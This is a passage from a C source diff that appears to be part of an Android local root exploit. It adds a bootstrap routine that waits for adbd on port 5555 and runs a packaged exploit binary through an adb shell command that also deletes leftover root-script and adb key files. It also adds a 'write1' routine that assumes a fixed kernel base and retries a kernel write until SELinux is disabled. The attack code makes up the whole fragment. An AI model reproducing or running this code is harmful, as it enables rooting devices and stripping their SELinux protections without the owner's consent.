+   * The remote helper already disables buffering, but bootstrap diagnostics
+   * must remain available to the app while it is running. */
+  set_unbuffer();
+  log_startup_context();
+
+  /* Wait for adb TCP on port 5555 */
+  pr_info("Waiting for adb TCP on port 5555...\n");
+  for (int i = 0; i < 30; i++) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in addr = {
+      .sin_family = AF_INET,
+      .sin_port = htons(5555),
+      .sin_addr.s_addr = htonl(0x7f000001)
+    };
+    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
+    if (sock >= 0) close(sock);
+    if (c == 0) {
+      pr_success("adbd ready on port 5555 (attempt %d)\n", i + 1);
+      goto tcp_ready;
+    }
+    usleep(1000000);
+  }
+  pr_error("adbd not on TCP 5555 after 30s; run 'adb tcpip 5555' from the PC first\n");
+  return 1;
+tcp_ready:
+  usleep(200000);
+  pr_info("Connecting via mini-adb...\n");
+  /* The shell spawned by adbd does not inherit this app process's
+   * environment. It can execute a known /data/app path but cannot enumerate
+  * that directory, so derive the packaged library path from `pm path`. */
+  int adb_ret = mini_adb_shell(
+    "rm -f /data/local/tmp/.ghostlock_root.sh /data/local/tmp/.ghostlock_w1 "
+    "/data/local/tmp/a/ghostlock_postroot.log /data/local/tmp/a/adbkey "
+    "/data/local/tmp/a/adbkey.pub /data/local/tmp/a/e; "
+    "APK=$(pm path " ANCHOR_BOOTSTRAP_PACKAGE " | sed -n 's/^package://p' | head -n 1); "
+    "APPBIN=${APK%/base.apk}/lib/arm64/libanchor.so; "
+    "if [ -n \"$APPBIN\" ] && [ -x \"$APPBIN\" ]; then "
+    "PSELECT_SHIFT=-2 PSELECT_ROUTE_DELAY_USEC=50000 \"$APPBIN\"; RC=$?; "
+    "else RC=126; fi; printf '\\n__ANCHOR_RC=%s\\n' \"$RC\"; exit \"$RC\"");
+  pr_info("mini-adb returned %d\n", adb_ret);
+
+  return adb_ret;
+}
+
+static int run_write1_only(void) {
+  disable_rseq_for_thread();
+  set_unbuffer();
+  set_limit();
+  if (!active_offsets && select_offsets() < 0) return 1;
+  init_ashmem_path();
+  pin_to_core(CORE);
+  kaslr_slide = 0;
+  kaslr_base = KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+
+  if (check_selinux_off()) {
+    pr_success("SELinux already off\n");
+    return 0;
+  }
+
+  for (int att = 1; att <= 20; att++) {
+    pr_info("Write 1 attempt %d/20\n", att);
+    run_w1_attempt(att);
+    usleep(100000);
+    if (check_selinux_off()) {
+      pr_success("SELinux DISABLED\n");
+      return 0;
+    }
+  }
+  pr_error("Write 1 failed after 20 attempts\n");
+  return 1;
+}
+
+int main(int argc, char **argv) {
+    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
+        return run_bootstrap();
+    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
+        return run_write1_only();
+    return run_exploit(argc, argv);
+}
